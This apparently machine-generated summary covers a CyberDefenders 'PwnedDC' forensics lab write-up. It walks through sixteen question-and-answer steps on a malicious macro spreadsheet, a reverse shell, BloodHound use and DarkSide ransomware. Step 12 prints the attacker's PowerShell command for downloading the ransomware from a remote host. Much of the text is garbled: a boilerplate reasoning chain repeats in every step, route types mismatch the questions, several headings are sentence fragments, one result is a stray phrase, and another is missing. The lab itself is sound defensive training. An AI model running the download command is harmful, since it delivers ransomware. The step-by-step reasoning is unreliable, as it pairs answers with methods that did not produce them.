# PwnedDC Lab

## Case Metadata

- Category: `Endpoint Forensics`
- Platform: `CyberDefenders`
- Difficulty: `Hard`
- Source PDF: `https://github.com/tim-barc/ctf_writeups/blob/main/writeups/cyber_defenders_pwneddc_lab.pdf`

## Why This Case Matters

Use this case as a Endpoint Forensics reference for disk-image, email, ids challenges.

## Input Signals

- Artifacts: disk-image, email, ids, memory, office-document, registry, windows-events
- Tools: olevba, strings, virustotal, volatility
- Techniques: browser-forensics, cti-enrichment, dns-analysis, http-analysis, maldoc-analysis, malware-static, memory-forensics, stego-extraction, windows-event-analysis

## First-Principles Route

- Start from artifact inventory: event logs, registry hives, browser data, file system timelines, memory, and application databases.
- Build a timeline around the suspicious user, process, file path, login, persistence item, or network connection.
- Correlate logs with file and registry evidence before trusting one artifact alone.
- Extract concrete indicators such as process names, command lines, hashes, timestamps, users, and persistence locations.

## Solve Thinking

### Step 1: Windows Defender initially detected the shellcode but was later disabled. Persistence

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use olevba, strings, virustotal, volatility to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use olevba, strings, virustotal, volatility to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `mshta.exe`

### Step 2: What is the name of the first malware detected by Windows Defender?

- Route type: `event-log correlation`
- Why: Event-log cases should be solved by field correlation, not by reading logs chronologically.
- Probe: Use olevba, strings, virustotal, volatility to search the relevant event IDs and correlate user, process, host, and timestamp fields.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as event-log correlation.
  - Use olevba, strings, virustotal, volatility to search the relevant event IDs and correlate user, process, host, and timestamp fields.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `Exploit:Win32/ShellCode.BN`

### Step 3: Provide the date and time when the attacker clicked send (submitted) the malicious email?

- Route type: `maldoc analysis`
- Why: Maldoc routes start with stream/macro extraction and decoding before behavior claims.
- Probe: Use olevba, strings, virustotal, volatility to extract macros, streams, embedded URLs, and decoded script content.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as maldoc analysis.
  - Use olevba, strings, virustotal, volatility to extract macros, streams, embedded URLs, and decoded script content.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `contained this attachment:`

### Step 4: when an email was submitted for sending from the client’s perspective (i.e., the threat actors mail client):

- Route type: `olevba-driven evidence lookup`
- Why: For Endpoint Forensics, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use olevba, strings, virustotal, volatility to collect the smallest evidence slice that answers the goal.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as olevba-driven evidence lookup.
  - Use olevba, strings, virustotal, volatility to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `2021-08-12 04:47`

### Step 5: What is the IP address and port on which the attacker received the reverse shell?

- Route type: `maldoc analysis`
- Why: Maldoc routes start with stream/macro extraction and decoding before behavior claims.
- Probe: Use olevba, strings, virustotal, volatility to extract macros, streams, embedded URLs, and decoded script content.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as maldoc analysis.
  - Use olevba, strings, virustotal, volatility to extract macros, streams, embedded URLs, and decoded script content.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.

### Step 6: which enables us to detect and extract macros within office documents, against this file:

- Route type: `maldoc analysis`
- Why: Maldoc routes start with stream/macro extraction and decoding before behavior claims.
- Probe: Use olevba, strings, virustotal, volatility with the extracted filter/query `python olevba.py "Unpaid Invoice.xls"` and inspect the matching evidence.
- Tools: olevba, strings, virustotal, volatility
- Filters or commands:
  - `python olevba.py "Unpaid Invoice.xls"`
  - `python olevba.py --show-pcode "Unpaid Invoice.xls"`
- Reasoning chain:
  - Recognize the goal as maldoc analysis.
  - Use olevba, strings, virustotal, volatility with the extracted filter/query `python olevba.py "Unpaid Invoice.xls"` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `192.168.112.128:8080`

### Step 7: What is the MITRE ID of the technique used by the attacker to achieve persistence?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use olevba, strings, virustotal, volatility to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use olevba, strings, virustotal, volatility to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `T1053.005`

### Step 8: What is the attacker's C2 domain name?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use olevba, strings, virustotal, volatility to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use olevba, strings, virustotal, volatility to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `c2.cyberdefenders.org`

### Step 9: What is the name of the tool used by the attacker to collect AD information?

- Route type: `event-log correlation`
- Why: Event-log cases should be solved by field correlation, not by reading logs chronologically.
- Probe: Use olevba, strings, virustotal, volatility to search the relevant event IDs and correlate user, process, host, and timestamp fields.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as event-log correlation.
  - Use olevba, strings, virustotal, volatility to search the relevant event IDs and correlate user, process, host, and timestamp fields.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `BloodHound`

### Step 10: What is the PID of the malicious process?

- Route type: `maldoc analysis`
- Why: Maldoc routes start with stream/macro extraction and decoding before behavior claims.
- Probe: Use olevba, strings, virustotal, volatility to extract macros, streams, embedded URLs, and decoded script content.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as maldoc analysis.
  - Use olevba, strings, virustotal, volatility to extract macros, streams, embedded URLs, and decoded script content.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `3140`

### Step 11: What is the family of ransomware?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use olevba, strings, virustotal, volatility to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use olevba, strings, virustotal, volatility to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `DarkSide`

### Step 12: What is the command invoked by the attacker to download the ransomware?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use olevba, strings, virustotal, volatility with the extracted filter/query `strings.exe .\memory.dmp | Select-String -Pattern "svchost.exe" >` and inspect the matching evidence.
- Tools: olevba, strings, virustotal, volatility
- Filters or commands:
  - `strings.exe .\memory.dmp | Select-String -Pattern "svchost.exe" >`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use olevba, strings, virustotal, volatility with the extracted filter/query `strings.exe .\memory.dmp | Select-String -Pattern "svchost.exe" >` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `Invoke-WebRequest http://192.168.112.128:8000/svchost.exe -OutFile svchost.exe`

### Step 13: What is the address where the ransomware stores the 567-byte key under the malicious process's memory?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use olevba, strings, virustotal, volatility to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use olevba, strings, virustotal, volatility to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `0x00b5f4a5`

### Step 14: What is the 8-byte word hidden in the ransomware process's memory?

- Route type: `memory artifact analysis`
- Why: Memory routes start broad with process/socket inventory, then narrow to suspicious process evidence.
- Probe: Use olevba, strings, virustotal, volatility to enumerate processes, network sockets, injected regions, and command lines.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as memory artifact analysis.
  - Use olevba, strings, virustotal, volatility to enumerate processes, network sockets, injected regions, and command lines.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `c0n6r475`

### Step 15: What is the ransomware file's internal name?

- Route type: `file metadata extraction`
- Why: When traffic yields a file, recover the object and inspect metadata before treating visible content as the answer.
- Probe: Use olevba, strings, virustotal, volatility to recover or open the referenced file and inspect its metadata fields.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as file metadata extraction.
  - Use olevba, strings, virustotal, volatility to recover or open the referenced file and inspect its metadata fields.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `svchost.exe`

### Step 16: find the internal name within the Version Info details:

- Route type: `olevba-driven evidence lookup`
- Why: For Endpoint Forensics, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use olevba, strings, virustotal, volatility to collect the smallest evidence slice that answers the goal.
- Tools: olevba, strings, virustotal, volatility
- Reasoning chain:
  - Recognize the goal as olevba-driven evidence lookup.
  - Use olevba, strings, virustotal, volatility to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `calimalimodumator.exe`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
